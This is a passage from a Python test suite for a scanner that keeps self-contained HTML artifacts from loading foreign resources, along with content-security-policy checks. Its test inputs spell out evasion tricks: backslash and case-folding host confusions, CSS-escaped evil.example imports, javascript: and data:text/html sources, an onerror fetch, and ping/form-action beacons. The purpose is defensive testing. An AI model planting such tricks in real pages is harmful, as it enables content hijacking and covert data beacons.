            f"{valid.replace('https://', 'HTTPS://')}",
            "https://platform.openai.com:8443/docs",
            _with_userinfo("https://" + FIXTURE_FOREIGN_HOST, "platform.openai.com/docs"),
        ):
            with self.subTest(msg=mutated):
                self.assertFalse(_OPENAI_URL(mutated))

    # -- E6: pre-parse character rejection --

    def test_e6_rejects_a_backslash_authority(self) -> None:
        """The scanner-versus-browser differential: Python reports the allowlisted host."""
        differential = _with_userinfo(f"https://{FIXTURE_FOREIGN_HOST}\\", "fonts.googleapis.com/x.css")
        self.assertEqual(urlsplit(differential).hostname, "fonts.googleapis.com")
        self.write_document(f'<link rel="stylesheet" href="{differential}">')

        self.assertReports(check_e6(self.gallery), "sample.html", differential)

    def test_e6_rejects_whitespace_control_and_delimiter_characters(self) -> None:
        for reference in (
            "https://fonts.googleapis.com/a b",
            "https://fonts.googleapis.com/a\tb",
            "https://fonts.googleapis.com/a\x7fb",
            "https://fonts.googleapis.com/a<b",
            "https://fonts.googleapis.com/a>b",
            "https://fonts.googleapis.com/a|b",
            "https://fonts.googleapis.com/a`b",
        ):
            with self.subTest(msg=repr(reference)):
                self.setUp()
                self.write_stylesheet(f"@import url('{reference}');")

                self.assertTrue(check_e6(self.gallery), f"{reference!r} was admitted")

    def test_e6_rejects_a_character_that_case_folds_into_an_allowlisted_host(self) -> None:
        """``casefold`` is lossy, so the grammar clause is what keeps E1 honest.

        U+017F is not ``s`` and folds to ``s``, so exact case-folded equality
        admits this host, the round-trip conjunction admits it, and a rejection
        written only as a list of bad delimiters admits it too. Executed rather
        than reasoned about: the assertions below are what the parser and the
        comparison actually do.
        """
        collision = "https://fontſ.gstatic.com/x.png"  # U+017F LATIN SMALL LETTER LONG S
        self.assertEqual(urlsplit(collision).hostname.casefold(), "fonts.gstatic.com")
        self.write_document(f'<img src="{collision}">')

        self.assertEqual(check_e1(self.gallery), [], "E1 alone admits it — that is the point")
        self.assertEqual(check_e5(self.gallery), [], "the round-trip conjunction alone admits it too")
        self.assertReports(check_e6(self.gallery), "sample.html", collision)

    def test_e6_reuses_the_repositorys_pre_parse_rejection(self) -> None:
        """Behavioural pin: the release-note policy rejects the same character classes."""
        self.assertTrue(_VALIDATED_HTTP_URL("https://fonts.googleapis.com/css2"))
        for reference in (
            "https://fonts.googleapis.com/a b",
            "https://fonts.googleapis.com/a\x01b",
            "https://fonts.googleapis.com/a\\b",
            "https://fonts.googleapis.com/a<b",
            "https://fonts.googleapis.com/a>b",
            "https://fonts.googleapis.com/a|b",
            "https://fonts.googleapis.com/a`b",
        ):
            with self.subTest(msg=repr(reference)):
                self.assertFalse(_VALIDATED_HTTP_URL(reference))

    # -- E7: the scheme rule, against the corpus this repository already owns --

    def test_e7_reuses_the_repositorys_unsafe_destination_corpus(self) -> None:
        corpus = _unsafe_destination_corpus()
        self.assertTrue(corpus, f"the unsafe-destination corpus was not found in {RELEASE_NOTE_POLICY_TEST.name}")
        for destination in corpus:
            relative = not urlsplit(destination).scheme and not destination.startswith("//")
            with self.subTest(msg=destination):
                self.setUp()
                self.write_document(f'<img src="{destination}">')
                if relative:
                    self.assertClean()
                else:
                    self.assertTrue(self.failures(), f"{destination!r} was admitted in a resource position")

    def test_e7_rejects_an_executable_scheme_in_a_resource_position(self) -> None:
        self.write_document('<img src="javascript:alert(1)">')

        self.assertReports(check_e7(self.gallery), "sample.html", "javascript:")

    def test_e7_accepts_an_embedded_image_or_font(self) -> None:
        """A ``data:`` URI is the only way the single-file rule admits an asset.

        Refusing it put the contract in conflict with itself: a conforming author
        embedding a raster got two failures — E7 for the scheme and E8 for the
        absent host — and no documented escape, so the pressure landed on
        weakening the gate rather than on the artifact.
        """
        self.write_document(
            '<img src="data:image/png;base64,iVBORw0KGgo=" alt="">'
            '<style>@font-face{font-family:X;src:url(data:font/woff2;base64,AAA)}'
            '.a{background:url("data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=")}</style>'
        )

        self.assertEqual(check_e7(self.gallery), [])
        self.assertEqual(check_e8(self.gallery), [])

    def test_e7_still_refuses_a_data_uri_carrying_a_document(self) -> None:
        """The allowance is bounded by media type, not granted to the scheme.

        ``data:text/html`` is a script execution context, so it is not an
        embedded asset however it is encoded.
        """
        self.write_document('<iframe src="data:text/html,<script>go()</script>"></iframe>')

        self.assertTrue(check_e7(self.gallery) or check_e8(self.gallery))

    def test_e7_accepts_a_same_document_relative_reference(self) -> None:
        self.write_document('<img src="#logo">')

        self.assertClean()

    # -- E8: fail closed on what an evader controls --

    def test_e8_rejects_an_absolute_reference_yielding_no_host(self) -> None:
        self.write_document('<img src="https://">')

        self.assertReports(check_e8(self.gallery), "sample.html")

    def test_e8_rejects_a_reference_that_cannot_be_parsed(self) -> None:
        self.write_document('<img src="https://[oops/x">')

        self.assertReports(check_e8(self.gallery), "sample.html")

    # -- E9: both @import forms --

    def test_e9_rejects_the_bare_string_import_form(self) -> None:
        self.write_stylesheet(f'@import "https://{FIXTURE_FOREIGN_HOST}/a.css";')

        self.assertScanned(CANONICAL_FILES[BRAND_BLOCK], FIXTURE_FOREIGN_HOST)

    def test_e9_rejects_the_url_token_import_form(self) -> None:
        self.write_stylesheet(f'@import url("https://{FIXTURE_FOREIGN_HOST}/a.css");')

        self.assertScanned(CANONICAL_FILES[BRAND_BLOCK], FIXTURE_FOREIGN_HOST)

    # -- E10: escapes are refused rather than decoded --

    def test_e10_rejects_an_escape_in_an_import_reference(self) -> None:
        self.write_stylesheet('@import "\\68 ttps://evil.example/a.css";')

        self.assertReports(check_e10(self.gallery), CANONICAL_FILES[BRAND_BLOCK])

    def test_e10_rejects_an_escape_in_a_url_token(self) -> None:
        self.write_stylesheet("body { background: url(\\68 ttps://evil.example/a.png); }")

        self.assertReports(check_e10(self.gallery), CANONICAL_FILES[BRAND_BLOCK])

    # -- E11: every srcset candidate, split by the documented algorithm --

    def test_e11_scans_every_candidate_not_only_the_first(self) -> None:
        self.write_document(
            '<img srcset="https://fonts.gstatic.com/a.png 1x, '
            f'https://{FIXTURE_FOREIGN_HOST}/b.png 2x">'
        )

        self.assertScanned("sample.html", f"https://{FIXTURE_FOREIGN_HOST}/b.png")

    def test_e11_does_not_treat_a_comma_inside_a_url_as_a_separator(self) -> None:
        self.write_document(f'<img srcset="https://{FIXTURE_FOREIGN_HOST}/x,y.png 1x">')

        self.assertScanned(f"https://{FIXTURE_FOREIGN_HOST}/x,y.png")

    def test_e11_scans_a_link_imagesrcset(self) -> None:
        self.write_document(
            f'<link rel="preload" as="image" imagesrcset="https://{FIXTURE_FOREIGN_HOST}/a.png 1x">'
        )

        self.assertScanned(f"https://{FIXTURE_FOREIGN_HOST}/a.png")

    # -- E12: scheme-relative references --

    def test_e12_rejects_a_scheme_relative_reference(self) -> None:
        self.write_document(f'<img src="//{FIXTURE_FOREIGN_HOST}/x.png">')

        self.assertReports(check_e12(self.gallery), "sample.html", f"//{FIXTURE_FOREIGN_HOST}/x.png")

    def test_e12_rejects_a_scheme_relative_reference_to_an_allowlisted_host(self) -> None:
        """A host-only rule sees an allowed host here; the prohibition is what fails it."""
        self.write_document('<img src="//fonts.gstatic.com/x.png">')

        self.assertReports(check_e12(self.gallery), "//fonts.gstatic.com/x.png")

    # -- the positions the earlier enumeration omitted --

    def test_the_omitted_element_positions_are_scanned(self) -> None:
        for markup in (
            '<source src="{url}">',
            '<source srcset="{url}">',
            '<video src="{url}"></video>',
            '<video poster="{url}"></video>',
            '<audio src="{url}"></audio>',
            '<track src="{url}">',
            '<object data="{url}"></object>',
            '<embed src="{url}">',
            '<input type="image" src="{url}">',
            '<svg><image href="{url}"></image></svg>',
            '<svg><use href="{url}"></use></svg>',
            '<svg><use xlink:href="{url}"></use></svg>',
            '<form action="{url}"></form>',
            '<a ping="{url}">go</a>',
            '<meta http-equiv="refresh" content="0;url={url}">',
            '<base href="{url}">',
            '<iframe src="{url}"></iframe>',
            '<script src="{url}"></script>',
        ):
            with self.subTest(msg=markup):
                self.setUp()
                self.write_document(markup.format(url=f"https://{FIXTURE_FOREIGN_HOST}/x"))

                self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)

    def test_every_fetching_link_relation_is_scanned(self) -> None:
        for relation in (
            "stylesheet",
            "preload",
            "modulepreload",
            "prefetch",
            "icon",
            "manifest",
            "preconnect",
            "dns-prefetch",
        ):
            with self.subTest(msg=relation):
                self.setUp()
                self.write_document(f'<link rel="{relation}" href="https://{FIXTURE_FOREIGN_HOST}/x">')

                self.assertScanned(FIXTURE_FOREIGN_HOST)

    # -- the style and network-call surface forms --

    def test_the_url_token_is_matched_in_every_ordinary_surface_form(self) -> None:
        for form in (
            "url({url})",
            "url('{url}')",
            'url("{url}")',
            "URL({url})",
            "url(  {url}  )",
            "url(\n  '{url}'\n)",
        ):
            with self.subTest(msg=form):
                self.setUp()
                self.write_stylesheet(
                    "body { background: " + form.format(url=f"https://{FIXTURE_FOREIGN_HOST}/x.png") + "; }"
                )

                self.assertScanned(FIXTURE_FOREIGN_HOST)

    def test_every_network_call_position_is_scanned(self) -> None:
        for call in (
            "fetch('{url}')",
            "request.open('GET', '{url}')",
            "new WebSocket('{url}')",
            "navigator.sendBeacon('{url}')",
            "new Worker('{url}')",
            "new EventSource('{url}')",
            "importScripts('{url}')",
            "import('{url}')",
        ):
            with self.subTest(msg=call):
                self.setUp()
                self.write_document(
                    "<script>\n" + call.format(url=f"https://{FIXTURE_FOREIGN_HOST}/x") + ";\n</script>"
                )

                self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)

    def test_a_network_call_inside_an_attribute_value_is_scanned(self) -> None:
        self.write_document(
            f"""<img src="{FIXTURE_ALLOWED_FONT_REQUEST}" onerror="fetch('https://{FIXTURE_FOREIGN_HOST}/x')">"""
        )

        self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)

    def test_a_character_reference_is_decoded_in_a_parsed_position(self) -> None:
        """Entity encoding is not an evasion where the parser owns the position."""
        self.write_document(f'<img src="&#104;ttps://{FIXTURE_FOREIGN_HOST}/x">')

        self.assertScanned(FIXTURE_FOREIGN_HOST)


# ---------------------------------------------------------------------------
# Group J — prohibited constructs (FR-027)
# ---------------------------------------------------------------------------


POLICY_EQUIV = "content-security-policy"
POLICY_VALUE = "'none'"
FORBIDDEN_POLICY_VALUE = "'self'"

# The five an in-document declaration can carry and the gallery needs none of,
# so restricting them breaks nothing.
REQUIRED_DIRECTIVES: tuple[str, ...] = ("base-uri", "form-action", "object-src", "frame-src", "connect-src")

# The three the in-document delivery algorithm strips. Their presence marks an
# author relying on protection that was removed.
STRIPPED_DIRECTIVES: tuple[str, ...] = ("report-uri", "report-to", "frame-ancestors", "sandbox")

# Elements that carry no content of their own, so their appearing before the
# declaration leaves nothing outside its coverage. J7 owns a declaration that
# is not in the head at all.
STRUCTURAL_ELEMENTS: frozenset[str] = frozenset({"html", "head", "body"})

HEAD_ELEMENT = "head"
BASE_ELEMENT = "base"
FORM_ELEMENT = "form"
SRCDOC_ATTRIBUTE = "srcdoc"
PING_ATTRIBUTE = "ping"
ACTION_ATTRIBUTE = "action"

# A scheme-relative reference written anywhere, not only in a position group E
# collects. The dotted host and the negative lookbehind are what keep an
# ordinary ``https://`` reference and a ``//`` line comment out of it.
_SCHEME_RELATIVE_TEXT_RE = re.compile(r"(?<![:/\w])//[A-Za-z0-9][A-Za-z0-9.\-]*\.[A-Za-z]{2,}")


def _artifacts(gallery_root: Path) -> list[tuple[str, str, list[_Element]]]:
    """Every artifact, parsed once: label, text, and elements in document order."""
    documents: list[tuple[str, str, list[_Element]]] = []
    for path in _artifact_files(gallery_root, "*.html"):
        text = _document_text(path)
        documents.append((_label(gallery_root, path), text, _elements(text)))
    return documents


def _construct_documents(gallery_root: Path) -> list[tuple[str, str, list[_Element]]]:
    """Every artifact, **plus the canonical head block**, parsed once each.

    Group E already made this scoping choice and states the reason at
    ``_gallery_files``: a foreign reference in a canonical file reaches every
    artifact and is fixable in none of them. The same is true of a prohibited
    construct and — more sharply — of the policy declaration, because the head
    block's marked region is copied verbatim into all 21 artifacts. A policy
    deleted there is a policy deleted everywhere, and while ART-001 shipped no
    artifact a templates-only sweep reached nothing at all: every construct and
    directive check would pass on an empty set while the shipped bytes went
    unread. ART-002 ports the first artifacts, so the sweep is no longer empty —
    but the scoping stays, because the reason for it never depended on the
    templates directory being empty.

    The canonical file is a **fragment**. Its region is what an artifact embeds,
    so it carries no ``head`` element of its own and no document order beyond the
    region. Only position-independent checks read this set; J7 and J8 stay
    artifact-only, because "a direct child of head" and "nothing content-bearing
    precedes it" are questions a fragment cannot answer and would answer wrongly.
    """
    documents = list(_artifacts(gallery_root))
    head = gallery_root / CANONICAL_FILES[HEAD_BLOCK]
    if head.is_file():
        text = _document_text(head)
        documents.append((_label(gallery_root, head), text, _elements(text)))
    # Markup assigned to a string inside a script reaches no HTML parser, so the
    # document pass above cannot see it — an ``on*`` handler or a ``base`` element
    # written that way was invisible to every construct check. The kit's own head
    # block builds the brand mark exactly this way, which is what makes it a real
    # position rather than a hypothetical one.
    return documents


def _construct_documents_with_script_markup(
    gallery_root: Path,
) -> list[tuple[str, str, list[_Element]]]:
    """``_construct_documents`` plus markup parsed out of script string literals.

    Read by the construct checks J1-J5 only. Markup assigned to a string reaches
    no HTML parser, so an ``on*`` handler or a ``base`` element written that way
    was invisible to every check — and the kit's own head block builds the brand
    mark exactly this way, which makes it a real position rather than a
    hypothetical one.

    NOT read by J6, J9 or J10. Those ask whether a *document* carries a policy
    declaration and what it says; a markup fragment is not a document and has no
    policy of its own, so asking would report every artifact that injects any
    markup at all.
    """
    documents = list(_construct_documents(gallery_root))
    for label, text, _ in list(documents):
        for number, markup in enumerate(_script_markup_literals(text), start=1):
            documents.append((f"{label}: <script> markup literal {number}", markup, _elements(markup)))
    return documents


def _policy_element(elements: list[_Element]) -> _Element | None:
    for element in elements:
        if element.tag != "meta":
            continue
        if any(name == "http-equiv" and value.casefold() == POLICY_EQUIV for name, value in element.attributes):
            return element
    return None


def _policy_content(element: _Element) -> str:
    return next((value for name, value in element.attributes if name == "content"), "")


def _directives(content: str) -> list[tuple[str, str]]:
    """Each directive as its name and the rest of its value, folded."""
    parsed: list[tuple[str, str]] = []
    for part in content.split(";"):
        tokens = part.split()
        if tokens:
            parsed.append((tokens[0].casefold(), " ".join(tokens[1:])))
    return parsed


def _encoding_declaration(element: _Element) -> bool:
    if element.tag != "meta":
        return False
    names = {name for name, _ in element.attributes}
    if "charset" in names:
        return True
    return any(name == "http-equiv" and value.casefold() == "content-type" for name, value in element.attributes)


def check_j1(gallery_root: Path) -> list[str]:
    """J1 — no ``base`` element.

    The one construct that defeats group E completely rather than partially. It
    carries no disallowed host: it changes what every *other* reference resolves
    to, so an artifact whose references are all relative loads all of them from
    an attacker's host with nothing foreign in any scanned position. No amount
    of host checking sees it, which is why it is a prohibition on the construct
    rather than a rule inside the scan. A single-file artifact has no use for
    one.
    """
    return [
        f"{label}: carries a '{BASE_ELEMENT}' element, which redefines what every relative reference "
        "resolves to and leaves no foreign host in any position group E scans"
        for label, _, elements in _construct_documents_with_script_markup(gallery_root)
        for element in elements
        if element.tag == BASE_ELEMENT
    ]


def check_j2(gallery_root: Path) -> list[str]:
    """J2 — no scheme-relative reference anywhere.

    Broader than E12, which reads the positions the scanner collects. Opened
    from disk the reference resolves against ``file:`` rather than a network
    scheme, which on one major platform composes a network-share path and an
    authenticated connection to an attacker-named host; and it is invisible to
    any pattern keyed on an explicit scheme.
    """
    return [
        f"{label}: carries the scheme-relative reference '{match.group(0)}', which resolves against the "
        "document's own scheme rather than a network one"
        for label, text, _ in _construct_documents_with_script_markup(gallery_root)
        for match in _SCHEME_RELATIVE_TEXT_RE.finditer(text)
    ]


def check_j3(gallery_root: Path) -> list[str]:
    """J3 — no ``on*`` event-handler attribute.

    Executable content in a position no resource-load scan reads. It can hold a
    network destination while the element's own ``src`` stays innocuous, which
    is why group E scans call literals inside attribute values as well — but the
    prohibition is what makes that scan's regex weakness not matter.
    """
    return [
        f"{label}: <{element.tag}> carries the event-handler attribute '{name}', which is executable "
        "content in a position no resource-load scan reads"
        for label, _, elements in _construct_documents_with_script_markup(gallery_root)
        for element in elements
        for name, _value in element.attributes
        if name.startswith(EVENT_HANDLER_PREFIX)
    ]


def check_j4(gallery_root: Path) -> list[str]:
    """J4 — no ``srcdoc`` attribute: a complete nested document, with its own
    script, carried in an attribute value."""
    return [
        f"{label}: <{element.tag}> carries a '{SRCDOC_ATTRIBUTE}' attribute, which is a complete nested "
        "document written inside an attribute value"
        for label, _, elements in _construct_documents_with_script_markup(gallery_root)
        for element in elements
        for name, _value in element.attributes
        if name == SRCDOC_ATTRIBUTE
    ]


def check_j5(gallery_root: Path) -> list[str]:
    """J5 — no ``form`` with an ``action``, and no ``ping`` attribute anywhere.

    Both send rather than fetch. ``ping`` is the sharper case because it rides
    the ``a`` element E2 exempts, so the exemption that keeps provenance links
    working would otherwise carry a beacon with it.
    """
    failures: list[str] = []
    for label, _, elements in _construct_documents_with_script_markup(gallery_root):
        for element in elements:
            names = {name for name, _ in element.attributes}
            if element.tag == FORM_ELEMENT and ACTION_ATTRIBUTE in names:
                failures.append(
                    f"{label}: carries a '{FORM_ELEMENT}' element with an '{ACTION_ATTRIBUTE}', which sends "
                    "rather than fetches"
                )
            if PING_ATTRIBUTE in names:
                failures.append(
                    f"{label}: <{element.tag}> carries a '{PING_ATTRIBUTE}' attribute, which sends a beacon "
                    "from the one position E2 exempts"
                )
    return failures


def check_j6(gallery_root: Path) -> list[str]:
    """J6 — every artifact carries an in-document policy declaration.

    The artifacts run with no server, so no response header reaches them and an
    in-document declaration is the only policy channel available. It is defense
    in depth layered behind group E and not a replacement for it — J1-J5 and
    E1-E12 each fail independently, so neither being weakened silently disarms
    the other. The directive set is narrow on purpose: the gallery legitimately
    needs none of the five, so restricting them breaks nothing.
    """
    failures: list[str] = []
    for label, _, elements in _construct_documents(gallery_root):
        element = _policy_element(elements)
        if element is None:
            failures.append(
                f"{label}: carries no in-document policy declaration, so the positions a static scan "
                "provably cannot see are covered by nothing"
            )
            continue
        named = {name for name, _ in _directives(_policy_content(element))}
        missing = [directive for directive in REQUIRED_DIRECTIVES if directive not in named]
        if missing:
            failures.append(
                f"{label}: the policy declaration names none of {missing}, so that reach is unrestricted"
            )
    return failures


def check_j7(gallery_root: Path) -> list[str]:
    """J7 — the declaration is a direct child of the head element.

    Anywhere else the whole policy is discarded at parse and the artifact looks
    protected while carrying nothing. There is no visible symptom — a console
    message at most — which is why this is checked at build time rather than
    left to a browser to reveal.
    """
    failures: list[str] = []
    for label, _, elements in _artifacts(gallery_root):
        element = _policy_element(elements)
        if element is None:
            continue  # J6 owns an absent declaration
        if element.parent != HEAD_ELEMENT:
            failures.append(
                f"{label}: the policy declaration sits inside '{element.parent}' rather than being a direct "
                f"child of '{HEAD_ELEMENT}', so it is discarded at parse and the artifact carries no policy"
            )
    return failures


def check_j8(gallery_root: Path) -> list[str]:
    """J8 — no content-bearing element precedes the declaration.

    Only a character-encoding declaration may. Content before it is outside its
    coverage, so the artifact is partly unprotected in a way nothing else
    reveals.
    """
    failures: list[str] = []
    for label, _, elements in _artifacts(gallery_root):
        element = _policy_element(elements)
        if element is None:
            continue  # J6 owns an absent declaration
        for preceding in elements[: element.order]:
            if preceding.tag in STRUCTURAL_ELEMENTS or _encoding_declaration(preceding):
                continue
            failures.append(
                f"{label}: '{preceding.tag}' precedes the policy declaration, so it is outside the "
                "declaration's coverage while the artifact reads as protected throughout"
            )
    return failures


def check_j9(gallery_root: Path) -> list[str]:
    """J9 — each restricted directive names ``'none'``, and never ``'self'``.

    A document opened from the filesystem has an implementation-defined, usually
    opaque origin, so ``'self'`` resolves inconsistently across engines — it is
    the value most likely to be written by an author who believes it is the
    conservative one.
    """
    failures: list[str] = []
    for label, _, elements in _construct_documents(gallery_root):
        element = _policy_element(elements)
        if element is None:
            continue  # J6 owns an absent declaration
        for name, value in _directives(_policy_content(element)):
            if name not in REQUIRED_DIRECTIVES:
                continue
            if value.casefold() != POLICY_VALUE:
                reason = (
                    f"resolves against an opaque filesystem origin and so differs across engines"
                    if value.casefold() == FORBIDDEN_POLICY_VALUE
                    else "leaves that reach open"
                )
                failures.append(f"{label}: the policy declaration sets '{name} {value}', which {reason}")
    return failures


def check_j10(gallery_root: Path) -> list[str]:
    """J10 — the declaration names none of the directives stripped in-document.

    The in-document delivery algorithm strips exactly the reporting-endpoint,
    frame-ancestry, and sandbox directives. None of the five J6 requires is
    among them, so their presence is not a partial policy — it is an author
    relying on protection that was silently removed.
    """
    failures: list[str] = []
    for label, _, elements in _construct_documents(gallery_root):
        element = _policy_element(elements)
        if element is None:
            continue  # J6 owns an absent declaration
        for name, _value in _directives(_policy_content(element)):
            if name in STRIPPED_DIRECTIVES:
                failures.append(
                    f"{label}: the policy declaration names '{name}', which is stripped from an in-document "
                    "declaration, so the artifact relies on protection that was removed"
                )
    return failures


GROUP_J_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("J1", check_j1),
    ("J2", check_j2),
    ("J3", check_j3),
    ("J4", check_j4),
    ("J5", check_j5),
    ("J6", check_j6),
    ("J7", check_j7),
    ("J8", check_j8),
    ("J9", check_j9),
    ("J10", check_j10),
)


class ProhibitedConstructTests(unittest.TestCase):
    """Group J against the shipped gallery.

    Under ART-001 the ``templates/`` sweep was empty — but the group was **not**
    vacuous even then, and it must not be. J1-J6, J9 and J10 read
    ``_construct_documents``, which adds the canonical head block, because that
    block's region is copied verbatim into all 21 artifacts: a construct or a
    weakened directive there ships everywhere at once. Only J7 and J8 stay
    artifact-only, since a fragment has no head element to be a direct child of.

    That distinction was a real defect before it was a design: with the group
    scoped to ``templates/`` alone, the entire policy declaration could be
    deleted from the shipped block and all of group J still passed.
    """

    def test_group_j_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_J_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_the_shipped_gallery_carries_exactly_its_shipped_entries(self) -> None:
        """The artifact sweep equals the ``shipped`` identifier set, both ways.

        This replaces ART-001's ``carries_no_artifact``, which asserted the
        sweep was empty. That was a true and useful statement while nothing was
        ported, and ART-002 is the change that makes it false — so it is
        rewritten to state the new truth rather than deleted, because deleting a
        non-vacuity guard is how a group silently stops binding.

        Stated as set equality against ``status`` so it needs no edit as further
        templates ship: each flip moves an identifier into both sides at once.
        D1 and D2 own the per-entry biconditional; this one owns the sweep, and
        so it also catches a file under ``templates/`` that no entry names at
        all.
        """
        shipped = {
            entry["id"]
            for entry in (_entries(GALLERY_ROOT) or [])
            if isinstance(entry, dict) and entry.get("status") == SHIPPED and isinstance(entry.get("id"), str)
        }
        swept = {path.stem for path in _artifact_files(GALLERY_ROOT, "*.html")}
        self.assertEqual(swept, shipped)

    def test_the_canonical_head_block_is_nonetheless_reached(self) -> None:
        """The scope fix, asserted rather than assumed.

        Without this the group reads an empty set and every check below passes
        for the wrong reason.
        """
        labels = [label for label, _, _ in _construct_documents(GALLERY_ROOT)]
        self.assertIn(CANONICAL_FILES[HEAD_BLOCK], labels)

    def test_the_shipped_policy_declaration_is_actually_guarded(self) -> None:
        """Delete the declaration from the canonical block; J6 must report it.

        The regression test for the finding itself. Operates on a copy of the
        real gallery so the assertion is about the shipped bytes, not a fixture
        that happens to resemble them.
        """
        with tempfile.TemporaryDirectory() as raw:
            gallery = Path(raw) / "artifact-gallery"
            shutil.copytree(GALLERY_ROOT, gallery)
            head = gallery / CANONICAL_FILES[HEAD_BLOCK]
            kept = [line for line in head.read_text().splitlines() if POLICY_EQUIV not in line.casefold()]
            head.write_text("\n".join(kept) + "\n")

            failures = check_j6(gallery)

        self.assertTrue(failures, "the shipped policy declaration is guarded by nothing")
        self.assertTrue(
            any(CANONICAL_FILES[HEAD_BLOCK] in failure for failure in failures),
            f"J6 reported {failures}, naming something other than the canonical block",
        )


# --- Group J fixtures ------------------------------------------------------

FIXTURE_POLICY = "base-uri 'none'; form-action 'none'; object-src 'none'; frame-src 'none'; connect-src 'none'"
FIXTURE_ARTIFACT_ID = "sample"
FIXTURE_ARTIFACT_LABEL = f"{TEMPLATES_DIR}/{FIXTURE_ARTIFACT_ID}.html"


class ProhibitedConstructFixtureCase(GalleryFixtureCase):
    """A synthetic artifact carrying exactly the construct under test."""

    def write_artifact(
        self,
        *,
        policy: str | None = FIXTURE_POLICY,
        before_policy: str = "",
        head: str = "",
        body: str = "",
        identifier: str = FIXTURE_ARTIFACT_ID,
        policy_in_body: bool = False,
    ) -> Path:
        declaration = (
            f'<meta http-equiv="Content-Security-Policy" content="{policy}">\n' if policy is not None else ""
        )
        return self.write(
            f"{TEMPLATES_DIR}/{identifier}.html",
            '<!doctype html>\n<html lang="en">\n<head>\n'
            '<meta charset="utf-8">\n'
            f"{'' if policy_in_body else before_policy}"
            f"{'' if policy_in_body else declaration}"
            f"{head}"
            "</head>\n<body>\n"
            f"{declaration if policy_in_body else ''}"
            f"{body}"
            "</body>\n</html>\n",
        )

    def failures(self) -> list[str]:
        collected: list[str] = []
        for _, check in GROUP_J_CHECKS:
            collected.extend(check(self.gallery))
        return collected


class ProhibitedConstructFixtureTests(ProhibitedConstructFixtureCase):
    """Group J against synthetic artifacts built in a temporary directory."""

    def test_a_conforming_artifact_passes_every_check(self) -> None:
        self.write_artifact(head='<title>Sample</title>\n', body="<h1>Sample</h1>\n")

        self.assertEqual(self.failures(), [])

    # -- J1: the construct that defeats group E completely --

    def test_j1_rejects_a_base_element(self) -> None:
        self.write_artifact(head=f'<base href="https://{FIXTURE_FOREIGN_HOST}/">\n')

        self.assertReports(check_j1(self.gallery), FIXTURE_ARTIFACT_LABEL, "base")

    # -- J2: scheme-relative references anywhere --

    def test_j2_rejects_a_scheme_relative_reference(self) -> None:
        self.write_artifact(body=f'<img src="//{FIXTURE_FOREIGN_HOST}/x.png">\n')

        self.assertReports(check_j2(self.gallery), FIXTURE_ARTIFACT_LABEL, f"//{FIXTURE_FOREIGN_HOST}")

    # -- J3: executable content in a position no resource scan reads --

    def test_j3_rejects_an_event_handler_attribute(self) -> None:
        self.write_artifact(body='<button onclick="run()">go</button>\n')

        self.assertReports(check_j3(self.gallery), FIXTURE_ARTIFACT_LABEL, "onclick")

    # -- J4: a complete nested document in an attribute value --

    def test_j4_rejects_a_srcdoc_attribute(self) -> None:
        self.write_artifact(body='<iframe srcdoc="<p>nested</p>"></iframe>\n')

        self.assertReports(check_j4(self.gallery), FIXTURE_ARTIFACT_LABEL, "srcdoc")

    # -- J5: the two send positions --

    def test_j5_rejects_a_form_with_an_action(self) -> None:
        self.write_artifact(body=f'<form action="https://{FIXTURE_FOREIGN_HOST}/collect"></form>\n')

        self.assertReports(check_j5(self.gallery), FIXTURE_ARTIFACT_LABEL, "action")

    def test_j5_accepts_a_form_without_an_action(self) -> None:
        self.write_artifact(body="<form><input></form>\n")

        self.assertEqual(check_j5(self.gallery), [])

    def test_j5_rejects_a_ping_attribute(self) -> None:
        self.write_artifact(body=f'<a href="#x" ping="https://{FIXTURE_FOREIGN_HOST}/beacon">go</a>\n')

        self.assertReports(check_j5(self.gallery), FIXTURE_ARTIFACT_LABEL, "ping")

    # -- J6: the declaration and its directives --

    def test_j6_rejects_an_artifact_with_no_declaration(self) -> None:
        self.write_artifact(policy=None)

        self.assertReports(check_j6(self.gallery), FIXTURE_ARTIFACT_LABEL)

    def test_j6_rejects_a_declaration_missing_a_required_directive(self) -> None:
        for directive in ("base-uri", "form-action", "object-src", "frame-src", "connect-src"):
            with self.subTest(msg=directive):
                self.setUp()
                kept = "; ".join(
                    part for part in FIXTURE_POLICY.split("; ") if not part.startswith(f"{directive} ")
                )
                self.write_artifact(policy=kept)

                self.assertReports(check_j6(self.gallery), FIXTURE_ARTIFACT_LABEL, directive)

    # -- J7: placement, which is what decides whether the policy exists at all --

    def test_j7_rejects_a_declaration_outside_the_head(self) -> None:
        self.write_artifact(policy_in_body=True)

        self.assertReports(check_j7(self.gallery), FIXTURE_ARTIFACT_LABEL, "head")

    # -- J8: coverage, which starts where the declaration does --

    def test_j8_rejects_a_content_bearing_element_before_the_declaration(self) -> None:
        self.write_artifact(before_policy="<title>Sample</title>\n")

        self.assertReports(check_j8(self.gallery), FIXTURE_ARTIFACT_LABEL, "title")

    def test_j8_accepts_a_character_encoding_declaration_before_it(self) -> None:
        self.write_artifact()

        self.assertEqual(check_j8(self.gallery), [])

    # -- J9: 'none', because a filesystem origin is opaque --

    def test_j9_rejects_a_self_valued_directive(self) -> None:
        self.write_artifact(policy=FIXTURE_POLICY.replace("connect-src 'none'", "connect-src 'self'"))

        self.assertReports(check_j9(self.gallery), FIXTURE_ARTIFACT_LABEL, "'self'")

    def test_j9_rejects_a_host_valued_directive(self) -> None:
        self.write_artifact(
            policy=FIXTURE_POLICY.replace("connect-src 'none'", f"connect-src https://{FIXTURE_FOREIGN_HOST}")
        )

        self.assertReports(check_j9(self.gallery), FIXTURE_ARTIFACT_LABEL, "connect-src")

    # -- J10: directives stripped from in-document delivery --

    def test_j10_rejects_a_directive_stripped_from_in_document_delivery(self) -> None:
        for directive in ("report-uri /r", "report-to endpoint", "frame-ancestors 'none'", "sandbox"):
            with self.subTest(msg=directive):
                self.setUp()
                self.write_artifact(policy=f"{FIXTURE_POLICY}; {directive}")

                self.assertReports(check_j10(self.gallery), FIXTURE_ARTIFACT_LABEL, directive.split()[0])


# ---------------------------------------------------------------------------
# Group G — upstream attribution (FR-020)
# ---------------------------------------------------------------------------

UPSTREAM_NOTICE_FILE = "UPSTREAM-NOTICE.md"

# The one name the notice must never take. ``infer_payload_source_path``
